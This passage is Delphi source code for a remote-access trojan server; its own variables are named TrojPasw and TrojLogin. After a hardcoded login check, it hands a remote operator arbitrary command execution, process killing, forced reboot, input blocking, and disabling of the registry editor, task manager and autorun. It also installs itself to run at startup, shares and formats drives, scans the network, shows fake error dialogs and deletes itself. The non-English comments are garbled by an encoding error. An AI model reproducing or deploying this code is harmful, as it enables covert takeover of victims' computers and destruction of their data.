    if Integer(ContinueLoop) <> 0 then
    if ExeFileName = FProcessEntry32.szExeFile then
       Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

Function WinReboot: Boolean;
// ������������� Windows
var
  hToken: THandle;
  tkp: _TOKEN_PRIVILEGES;
  DUMMY: PTokenPrivileges;
  DummyRL: Cardinal;

Begin
  Result:=False;
  DUMMY:=nil;
  If (Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken)) Then Exit;

  If (Not LookupPrivilegeValue(nil, 'SeShutdownPrivilege',
      tkp.Privileges[0].Luid)) Then Exit;

  tkp.PrivilegeCount := 1;
  tkp.Privileges[0].Attributes := $0002; //SE_PRIVILEGE_ENABLED = $00002

  AdjustTokenPrivileges(hToken, FALSE, tkp, 0, Dummy, DummyRL);

  If (GetLastError <> ERROR_SUCCESS) Then Exit;

  If (Not ExitWindowsEx(EWX_REBOOT Or EWX_FORCE, 0)) Then Exit;
  Result:=True; // �� ���� �, ������ �����, �� �����
End;

Procedure SExec(const CStr, ToDo: String);
// ��������� Shell �������
Var Err: Integer;
Begin
   // ToDo: open - ������� ������ (����, ����� � �.�.)
   // explore - ��������� Explorer � ��������� ���������� (� �� ���������)
   // print - ������ �����
   Err:=ShellExecute(0, PChar(ToDo), PChar(CStr), nil, nil, SW_SHOWNORMAL);
   WriteLf(SysErrorMessage(Err));
End;

Procedure MsgAlert(Text: String);
// ������� ���������
Var Caption: String;
Begin
   Caption:='Access violation';
   if (Length(Text) = 0) Then Text := Caption;
   MessageBox(FindWindow(nil, 'FolderView'), PChar(Text), PChar(Caption),
                     MB_ICONERROR + MB_SYSTEMMODAL + MB_OKCANCEL);
         // ��, ��������� �� �������� ����� ;-)
End;

Procedure Do_cmd(Cmd: String);
// ��������� ���������� �������
Var Sz: Int64;
   Procedure Do_int_cmd;
   Var Param1, Param2: String;
      Function GetParams: Boolean;
         Var BSPos: Integer;
            Begin
               BSPos:=Pos('\ ', Cmd);
               Param1:=Copy(Cmd, 1, BSPos - 1);
               Param2:=Copy(Cmd, BSPos + 2, Length(Cmd));
               If ((Param1 = '') Or (Param2 = '')) Then
                  Begin
                     Result:=False;
                     WriteLf(ErrArray[3]);
                     Exit;
                  End;
               Result:=True;
            End;
         Function CheckCmd(l_Cmd: String; ErrNum: Byte): Boolean;
         Begin
            If (Cmd = '') Then
               Begin
                  Result:=False;
                  WriteLf(ErrArray[ErrNum]);
               End
            Else Result:=True;
         End;
      Begin
         If (Cmd = '\q') Or (Cmd = '\quit')
            Or (Cmd = '\exit') Or (Cmd = '\bye') Or (Cmd = '\x') Then
            Begin
               WriteLf(Disc_String);
               ClnStop(Srv,Cln);
            End
         Else
         If ((Cmd = '\v') Or (Cmd = '\V')) Then
            Begin
               WriteLf(Ver);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cd') Then
            Begin
               ChDir(Copy(Cmd, 5, Length(Cmd) - 4));
               ShErr;
            End
         Else
         If (Cmd = '\pwd') Then
            Begin
               Pwd;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ls') Then
            Begin
               ls(Copy(Cmd, 5, Length(Cmd) - 4));
            End
         Else
         If (Trim(Copy(Cmd, 1, 10)) = '\blockreg') Then
            Begin
               BlockReg(StrToIntDef(Copy(Cmd, 11, Length(Cmd) - 10), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 14)) = '\blockautorun') Then
            Begin
               BlockAutoRun(StrToIntDef(Copy(Cmd, 15, Length(Cmd) - 14), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 9)) = '\blocktm') Then
            Begin
               BlockTaskMgr(StrToIntDef(Copy(Cmd, 10, Length(Cmd) - 9), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\sf') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd) - 4);
               If GetParams Then SF(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\findm') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\finds') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, StrToIntDef(Param2, 0));
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\mkdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd));
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     If (Not Forcedirectories(Cmd))
                     Then WriteLf(ErrArray[10]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\rmdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If CheckCmd(Cmd, 2) Then
                  Begin
                     RmDir(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cat') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Cat(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cp') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Cp(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\du') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Sz:=Du(Cmd);
                     If (Sz <> -1) Then
                        Begin
                           Write(Sz);
                           WriteLf(' Blocks');
                           Write(Trunc(Sz/1000));
                           WriteLf(' KB');
                        End
                     Else WriteLf(ErrArray[9]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\mv') Then
            Begin
               // ��������������/�����������
               Cmd := Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Mv(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\rm') Then
            Begin
               // ��� ����� � ����� �� ��������... :-?
               // � �����! ����� ����� ���������! ������ �� ��������.
               Cmd:=Copy(Cmd, 5, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Rm(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\rmr') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 5);
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     Rmr(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ds') Then
            Begin
               // ����� �����
               // ����� �����: 0 - �������, 1 - A, 2 - B, 3 - C � �.�.
               If (Length(Cmd) < 5) Then DiskStat(#0)
               Else DiskStat(Copy(Cmd, 5, 1)[1]);
            End
         Else
         If (Cmd = '\ps') Then
            Begin
               Ps;
            End
         Else
         If (Cmd = '\dre') Then
            Begin
               DriveEx;
            End
         Else
         If (Cmd = '\getwindows') Then
            Begin
               GetWindowsPath;
            End
         Else
         If (Cmd = '\getcomp') Then
            Begin
               GetCompUser;
            End
         Else
         If (Cmd = '\getip') Then
            Begin
               GetLocalIP;
            End
         Else
         If (Cmd = '\shared') Then
            Begin
               ShareDisk;
            End
         Else
         If (Cmd = '\shareddel') Then
            Begin
               ShareDiskDel;
            End
         Else
         If (Cmd = '\autorun') Then
            Begin
               AutoReg;
            End
         Else
         If (Cmd = '\getos') Then
            Begin
              WriteLf(GetOSVersionText);
            End
         Else
         If (Cmd = '\firewall') Then
            Begin
               ExecConsoleApp('netsh firewall show rule name=all');
               ExecConsoleApp('netsh advfirewall firewall show rule name=all');
            End
         Else
         If (Cmd = '\myfire') Then
            Begin
               MyFirewall;  //myfire
            End
         Else
         If (Trim(Copy(Cmd, 1, 9)) = '\formatd') Then //FormatDrive('A');
            Begin
               Cmd:=Copy(Cmd, 10, Length(Cmd) - 9);
               ch:=Cmd[1];
               WriteLf(' ==> ');
               FormatDrive(ch);
               WriteLf('-===FormatDrive===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 13)) = '\findallcomp') Then
            Begin
               Cmd:=Copy(Cmd, 14, Length(Cmd) - 13);
               WriteLf(' ==> ');
               FindAllComputers(Cmd);
               WriteLf('-===FindAllComputers===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\encs') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' ==> ');
               WriteLf(EncS(Cmd,KeyRelease));
               WriteLf('-===EncryptString===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\decs') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' ==> ');
               WriteLf(DecS(Cmd,KeyRelease));
               WriteLf('-===DecryptString===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\encf') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' ==> ');
               If GetParams Then Write(EncF(Param1, Param2));
               WriteLf('-===EncryptFile===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\decf') Then
            Begin
               Cmd:=Copy(Cmd, 7, Length(Cmd) - 6);
               WriteLf(' ==> ');
               If GetParams Then Write(DecF(Param1, Param2));
               WriteLf('-===DecryptFile===-');
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\kill') Then
            Begin
               If Not Kill(StrToIntDef(Copy(Cmd, 7, Length(Cmd) - 6), -1)) Then
                  WriteLf(ErrArray[8]);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\killp') Then
            Begin
                  Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
                  KillTask(Cmd);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\killx') Then   //����� ��� ��������
            Begin
                  KillTask(Copy(Cmd, 8, Length(Cmd)));
                  WriteLf(ErrArray[8]);
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cmd') Then
            Begin
               Cmd:=Comspec + ' ' + Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     ExecConsoleApp(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\run') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'open');
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\print') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 6);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'print');
                  End;
            End
         Else
         If (Cmd = '\bi') Then
            Begin
               BlockInput(True);
            End
         Else
         If (Cmd = '\ubi') Then
            Begin
               BlockInput(False);
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\msg') Then
            Begin
               MsgAlert(Copy(Cmd, 6, Length(Cmd)));
            End
         Else
         If (Cmd ='\reboot') Then
            Begin
               ClnStop(Srv, Cln);
               If (Not WinReboot) Then WriteLf(ErrArray[6]);
            End
         Else
         If (Cmd = '\s') Then
            Begin
               Write('WARNING! Server will be halted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     Halt;
                  End;
            End
         Else
         If (Cmd = '\r') Then
            Begin
               Write('WARNING! Server will be restarted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     StartServer(StrToIntDef(l_port, 0));
                  End;
            End
         Else
         If (Cmd = '\delserver') Then
            Begin
               Write('WARNING! SERVER BINARY WILL BE REMOVED!!! CONTINUE(y,N)' + PS2);
               Cmd := ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf('��������. ������! ���..');
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     DeleteSelf;
                     //ExitProcessProc:=@DeleteSelf;
//                     Halt;
                  End;
            End
         Else
         If (Cmd = '\h') Or (Cmd = '\?') Or (Cmd = '\help') Then
            Begin
               Usage;
            End
         Else WriteLf(ErrArray[7]);
      End;
   Procedure Do_ext_cmd;
      Begin
         ExecConsoleApp(Cmd);
      End;
Begin
   If Length(Cmd) < 1 Then Exit;
   If (Cmd[1] = '\') Then Do_int_cmd //������� ����������
   Else Do_ext_cmd; //������� �������
End;

Function Main(dwEntryPoint: Pointer): dword; stdcall;
Begin
   Srv := StartServer(StrToIntDef(l_port, 0));
   If (Srv <= 0) Then Halt(1);
   Repeat
      Sleep(10);
      Cln := WaitClient(Srv);
      AssignCrtSock(Cln, Tf, Output);
      Send(Cln, PChar(Str_Hello), Length(Str_Hello), 0);
      Send(Cln, PChar(Str_Login), Length(Str_Login), 0);
      CurLogin := ReadLogin;
//      TrmCmd:=ReadLogin;
      Send(Cln, PChar(Str_Psw), Length(Str_Psw), 0);
      If (ReadPasw <> DecS(TrojPasw,KeyRelease)) Then  //DecS(TrojPasw,KeyRelease))  //GetRealPasw(TrojPasw)
      // ��������������� ������
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv, Cln);
               End;
            Continue;
         End;
      if (CurLogin <> TrojLogin) Then
      // ��������������� �����
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv,Cln);
               End;
            Continue;
         End;
      Write(LN_FEED);
      While Check_Avail
         Do
            Begin
               Write(PS1);
               TrmCmd := ReadCmd;
               Do_cmd(TrmCmd);
               Sleep(100);
            End;

   Until false;
   Disconnect(Cln);
   ExitThread(0);
End;

Begin
   Main(nil);
End.
